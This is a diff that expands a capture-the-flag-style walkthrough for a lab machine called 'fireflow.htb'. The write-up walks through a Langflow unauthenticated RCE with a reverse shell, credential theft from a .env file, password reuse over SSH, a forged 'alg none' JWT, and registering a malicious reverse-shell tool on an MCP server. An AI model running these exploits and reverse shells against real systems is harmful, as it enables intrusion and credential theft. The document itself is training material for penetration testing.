@@ -29,28 +29,47 @@
 
 ## Step 1: Reconnaissance - Port Scanning
 
-### Nmap Results
+### Why We Start with Nmap
+
+The first step in any penetration test is reconnaissance. We need to understand what services are running on the target machine, what ports are open, and what versions of software are being used. This information helps us identify potential vulnerabilities.
+
+### Nmap Command Explained
 
 ```bash
 nmap -n -Pn -sV -sC 10.129.5.237
 ```
 
+**Flag Breakdown:**
+- `-n`: Skip DNS resolution (faster scanning)
+- `-Pn`: Treat host as online (skip ping check)
+- `-sV`: Version detection - identifies service versions
+- `-sC`: Run default scripts - basic vulnerability checks
+
 
 ![[Pasted image 20260808145845.png]]
 
-**Open ports discovered:**
-- Port 22 (SSH) - OpenSSH 9.6p1 Ubuntu
-- Port 80 (HTTP) - Redirects to HTTPS
-- Port 443 (HTTPS) - Nginx with SSL certificate
+### Nmap Results Analysis
 
-**Key findings:**
-- SSL certificate reveals domain: `fireflow.htb`
-- Subject Alternative Names: `fireflow.htb`, `*.fireflow.htb`
+**Open ports discovered:**
+- **Port 22 (SSH)** - OpenSSH 9.6p1 Ubuntu
+    - This is the Secure Shell service for remote administration        
+    - Version 9.6p1 is relatively recent, likely no critical public exploits
+
+- **Port 443 (HTTPS)** - Nginx with SSL certificate
+    - The main web server running on HTTPS
+    - SSL certificate reveals domain: `fireflow.htb`
+    - Subject Alternative Names (SAN): `fireflow.htb`, `*.fireflow.htb`
+    - This tells us there may be subdomains to discover
+
+**Key Discovery:** The SSL certificate's SAN field is extremely valuable - it tells us the machine is configured for multiple domains, potentially including subdomains we should enumerate.
+
 ### Hosts File Configuration
 
 ```bash
 echo "10.129.5.237 fireflow.htb" | sudo tee -a /etc/hosts
 ```
+
+**Why This Matters:** The web server uses virtual host configuration. If we access the IP directly, the server won't know which website to serve. By adding `fireflow.htb` to our hosts file, we ensure our browser and tools can resolve the domain correctly.
 
 
 ---
@@ -60,6 +79,11 @@ echo "10.129.5.237 fireflow.htb" | sudo tee -a /etc/hosts
 ### Website Overview
 
 Visiting `https://fireflow.htb` reveals "FireFlow" - an intelligence automation platform for Task Force Nightfall.
+
+**What We See:** The page describes itself as "Active-defense tooling for the joint mission cell" and mentions "Task Force Nightfall's internal intelligence automation platform." This context is important because:
+1. It suggests a custom application
+2. The "Nightfall" name appears multiple times (this becomes important later)
+3. The platform likely handles sensitive data
 
 
 ![[Pasted image 20260808151916.png]]
@@ -71,8 +95,13 @@ Visiting `https://fireflow.htb` reveals "FireFlow" - an intelligence automatio
 https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
 ```
 
+**Why This Matters:**
+- This reveals a subdomain (`flow.fireflow.htb`)
+- The URL contains a UUID-like ID (`7d84d636-af65-42e4-ac38-26e867052c25`)
+- This ID is likely a `flow_id` used by the application
+- The path `/playground/` suggests this is a testing/development environment
 
-Add the subdomain to hosts:
+**Add the subdomain to hosts:**
 ```bash
 echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
 ```
@@ -81,26 +110,47 @@ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
 ![[Pasted image 20260808151951.png]]
 
 
-**Verssion finding**
+**Version discovery:**
 ```url
 /app/v1/version
 ```
 
+
 ![[Pasted image 20260808151859.png]]
+
+**Why We Check Versions:** Software version information helps us:
+- Identify known vulnerabilities (CVEs)
+- Understand the technology stack
+- Find public exploits that might work
+
+**Langflow Version:** 1.8.2
 
 
 ![[Pasted image 20260809074104.png]]
 
-**Langflow Version:** 1.8.2 (Vulnerable to CVE-2026-33017)
+**What is Langflow?** Langflow is a popular open-source tool for building AI-powered agents and workflows. It's used to create LLM (Large Language Model) applications visually.
+
+**Why This Version Matters:** Version 1.8.2 has a known critical vulnerability - CVE-2026-33017 - which allows unauthenticated remote code execution. This is our entry point.
+
 
 
 ---
 
 ## Step 3: CVE-2026-33017 - Langflow Unauthenticated RCE
 
-### Vulnerability Discovery
+### Understanding the Vulnerability
 
-**CVE-2026-33017** is a critical RCE vulnerability in Langflow versions before 1.8.2. The vulnerability allows unauthenticated attackers to execute arbitrary Python code via the `/api/v1/build_public_tmp/{flow_id}/flow` endpoint. The only requirement is knowledge of a valid `flow_id`.
+**CVE-2026-33017** is a critical Remote Code Execution (RCE) vulnerability in Langflow versions before 1.8.2.
+
+**How It Works:**
+1. Langflow has an endpoint: `/api/v1/build_public_tmp/{flow_id}/flow`
+2. This endpoint is supposed to allow users to preview flows
+3. However, it doesn't properly sanitize input
+4. An attacker can send crafted Python code in the request
+5. The server executes this code with `exec()` - no sandboxing!
+6. This happens WITHOUT authentication    
+
+**The Only Requirement:** A valid `flow_id` - which we already found in the URL!
 
 ### Exploitation
 
@@ -108,6 +158,8 @@ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
 ```
 7d84d636-af65-42e4-ac38-26e867052c25
 ```
+
+**Why We Use a Public POC:** Public proof-of-concept code saves time and reduces errors. We found a repository specifically for CVE-2026-33017.
 
 In the search results there was a [public poc repo](https://github.com/EQSTLab/CVE-2026-33017) so let’s clone it and try that exploit
 
@@ -119,24 +171,39 @@ The error was because we are trying to connect to a HTTPS server with an unknown
 
 ![[Pasted image 20260809074632.png]]
 
+**Why This Works:** In penetration testing, we often encounter self-signed certificates. Since we're in a controlled environment and not worried about man-in-the-middle attacks, disabling certificate validation is acceptable for exploitation.
 
-Save and run the exploit file
+#### Setting Up the Reverse Shell
 
+**Listener (Terminal 1):**
 ```bash
 #In new terminal
 nc -lvnp 4444
 ```
 
+**`nc` flags explained:**
+- `-l`: Listen mode (act as a server)
+- `-v`: Verbose output (show connection details)
+- `-n`: No DNS resolution
+- `-p 4444`: Listen on port 4444 
 
+**Why Port 4444?** It's a common, non-standard port that's less likely to be blocked by firewalls.
+
+#### Running the Exploit
 ```bash
 #New another terminal
 python3 exploit.py --url https://flow.fireflow.htb/ --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost 10.10.14.163 --lport 4444
 ```
 
-
 ![[Pasted image 20260808205444.png]]
 
-**Result:**
+**Arguments Explained:**
+- `--url`: The base URL of the Langflow instance
+- `--flow-id`: The flow ID we discovered
+- `--lhost`: Our local IP address (where the reverse shell connects back to)
+- `--lport`: The port our listener is on
+
+**Result(Shell Obtained):**
 ```bash
 www-data@fireflow:/var/lib/langflow$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -145,13 +212,24 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ![[Pasted image 20260808205523.png]]
 
+**What User Are We?** `www-data` is the default web server user on Linux systems. This is a low-privilege user with limited permissions.
+
+**Why This Matters:** We're inside the system, but we need to escalate privileges. The `www-data` user typically:
+- Cannot write to most directories
+- Cannot run sudo
+- Has limited access to sensitive files
+
+
 
 ---
 
 ## Step 4: Privilege Pivot - Password Reuse Attack
 
-### Langflow .env File
+#### Understanding Password Reuse
 
+Password reuse is one of the most common security failures. When a password is used in multiple places, compromising one system often leads to compromising others.
+
+#### Finding the .env File
 ```bash
 www-data@fireflow:/var/lib/langflow$ cat /etc/langflow/.env
 ```
@@ -159,7 +237,13 @@ www-data@fireflow:/var/lib/langflow$ cat /etc/langflow/.env
 
 ![[Pasted image 20260808220812.png]]
 
-**Contents:**
+**What is .env?** Environment files store configuration variables for applications. They often contain:
+- Database credentials
+- API keys
+- Application secrets
+- User passwords
+
+**Contents Discovered:**
 ```
 LANGFLOw_AUTO_LOGIN=FALSE
 LANGFLOw_SUPERUSER=langflow
@@ -171,11 +255,27 @@ LANGFLOw_NEW_USER_IS_ACTIVE=FALSE
 LANGFLOw_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
 ```
 
+**Analysis:**
+- `LANGFLOw_SUPERUSER`: The admin username is `langflow`
+- `LANGFLOw_SUPERUSER_PASSWORD`: The admin password is `n1ghtm4r3_b4_n1ghtf41l`
+- Notice the pattern: "nightmare for nightfall" - this connects to "Task Force Nightfall"!
+
 ### Password Reuse
 ```bash
 www-data@fireflow:/var/lib/langflow$ cat /etc/passwd | grep nightfall
 nightfall:x:1000:1000::/home/nightfall:/bin/bash
 ```
+
+**What is /etc/passwd?** This file stores user account information on Linux systems. Each line represents a user with fields separated by colons.
+
+**Why This User Matters:** We found a user named `nightfall` on the system. This matches the "Task Force Nightfall" branding we saw on the website. The password we found might be reused here!
+
+### The Password Reuse Hypothesis
+
+**Our Assumption:**
+- The Langflow superuser password (`n1ghtm4r3_b4_n1ghtf41l`)
+- Might also be the password for the `nightfall` user
+- This is common in development environments where convenience > security
 
 
 **Test password on nightfall:**
@@ -184,8 +284,17 @@ ssh nightfall@fireflow.htb
 Password: n1ghtm4r3_b4_n1ghtf41l
 ```
 
+**Why SSH?** SSH (Secure Shell) gives us a proper interactive shell with more privileges and stability than our reverse shell.
+
+**Result:** SUCCESS! We're logged in as the `nightfall` user!
 
 ![[Pasted image 20260808220827.png]]
+
+**What Changed?**
+- `nightfall` is a real user with a home directory
+- We have better stability (SSH doesn't die like reverse shells)
+- We can access this user's files
+
 
 **User Flag:**
 ```bash
@@ -203,7 +312,11 @@ nightfall@fireflow:~$ cat user.txt
 
 ## Step 5: MCP Server - JWT Algorithm Confusion (CVE-2026-29000)
 
-### MCP Configuration Discovery
+#### What is MCP?
+
+**MCP** stands for **Model Context Protocol**. It's a framework for building AI tool integrations. In this case, it's running as a service on the machine.
+
+#### Discovering MCP Configuration
 
 ```bash
 nightfall@fireflow:~$ cat ~/.mcp/config.json
@@ -222,7 +335,12 @@ nightfall@fireflow:~$ cat ~/.mcp/config.json
 }
 ```
 
-### Server Information
+**What We Learned:**
+- There's a service running on port `30080`
+- It has credentials: `langflow-bot` / `Langflow@mcp2026!`
+- It has a status endpoint we can query 
+
+#### Exploring the MCP Server
 ```bash
 nightfall@fireflow:~$ curl -s http://10.129.244.214:30080/api/v1/version | python3 -m json.tool
 ```
@@ -247,9 +365,24 @@ nightfall@fireflow:~$ curl -s http://10.129.244.214:30080/api/v1/version | pytho
 }
 ```
 
-**Vulnerability:** The server accepts `none` as a JWT signing algorithm.
+**Critical Discovery:** The server supports the `none` algorithm for JWT (JSON Web Tokens)!
 
-### User JWT Token
+### Understanding JWT and the Vulnerability
+
+**What is JWT?** JSON Web Tokens are a standard for representing claims securely between parties. They consist of three parts:
+1. **Header** - Contains the algorithm used
+2. **Payload** - Contains the actual data (claims)
+3. **Signature** - Validates the token hasn't been tampered with
+
+**The Algorithm Confusion Vulnerability:**
+1. The `none` algorithm means the signature is not used
+2. An attacker can change the algorithm in the header to `none`
+3. The server will skip signature verification
+4. The attacker can forge ANY claims
+
+**Why This Matters:** We can create our own JWT with `role: admin` and the server will accept it!
+
+#### Getting a User JWT Token
 ```bash
 USER_JWT=$(curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
 -H 'Content-Type: application/json' \
@@ -262,6 +395,15 @@ echo $USER_JWT
 
 ![[Pasted image 20260809000219.png]]
 
+
+**Why Localhost?** We're using SSH tunneling through nightfall to access the service via `127.0.0.1:30080` instead of the internal IP.
+
+**What This Does:**
+1. Authenticates to the MCP server using the credentials we found
+2. Receives a JWT token
+3. Stores it in the `USER_JWT` variable
+
+
 **Decoded Token:**
 ```bash
 echo $USER_JWT | cut -d. -f2 | base64 -d 2>/dev/null
@@ -269,13 +411,21 @@ echo $USER_JWT | cut -d. -f2 | base64 -d 2>/dev/null
 
 ![[Pasted image 20260809000234.png|563]]
 
+
+**JWT Structure:**
+- Part 1 (Header): Base64 encoded JSON
+- Part 2 (Payload): Base64 encoded JSON
+- Part 3 (Signature): The signature
+
+**Decoded Payload:**
 ```json
 {"sub":"langflow-bot","role":"user"}
 ```
+**Analysis:** Our token has `role: "user"`. To perform administrative actions, we need `role: "admin"`.
 
-### Forge Admin JWT Token
+### Crafting a Forged Admin JWT Token
 
-**craft.py:**
+**The craft.py script:**
 ```bash
 cat > craft.py << 'EOF'
 import base64, json
@@ -296,6 +446,13 @@ python3 craft.py
 
 ![[Pasted image 20260809001032.png]]
 
+**Step-by-Step Explanation:**
+1. `b64url()` function: Encodes data to base64 URL-safe format and removes padding
+2. We create a header: `{"alg":"none","typ":"JWT"}`
+3. We create a payload: `{"sub":"attacker","role":"admin"}`
+4. We combine them: `header.payload.` (notice the trailing dot)
+5. The trailing dot is important - it represents an empty signature
+
 **Forged Token:**
 ```
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.
@@ -304,7 +461,8 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9
 save Token to variable `ADMIN_JWT`
 ![[Pasted image 20260809001045.png]]
 
-### Register Malicious Tool
+
+### Registering a Malicious Tool
 
 ```bash
 ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
@@ -325,9 +483,22 @@ curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
 {"status":"registered","name":"shell"}
 ```
 
-### Trigger Reverse Shell
+**What This Does:**
+1. Uses our forged admin token to authenticate
+2. Registers a new tool called `shell`
+3. The tool's code is a Python reverse shell
 
-**Setup Listener:**
+**Reverse Shell Code Explained:**
+- `os.fork()`: Creates a child process
+- `os.setsid()`: Creates a new session (detaches from parent)
+- `socket.socket()`: Creates a network socket
+- `s.connect()`: Connects to our listener IP and port
+- `os.dup2()`: Redirects stdin, stdout, stderr to the socket
+- `pty.spawn()`: Spawns an interactive shell
+
+### Triggering the Reverse Shell
+
+**Listener Setup:**
 ```bash
 #new terminal
 nc -lvnp 4444
